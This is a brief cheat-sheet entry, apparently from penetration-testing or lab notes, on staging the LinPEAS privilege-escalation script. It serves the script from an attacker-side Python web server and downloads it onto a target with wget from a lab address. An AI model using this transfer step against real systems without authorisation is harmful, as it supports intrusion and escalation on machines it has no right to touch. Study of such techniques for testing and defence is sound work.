## LinPEAS

- Find the linpeas script `locate linpeas.sh`
- Copy it to a 'transfers' folder and cd into it
- Start a web server with `python3 -m http.server 80` 
- Download the linpeas script `wget http://10.0.2.9/linpeas.sh`
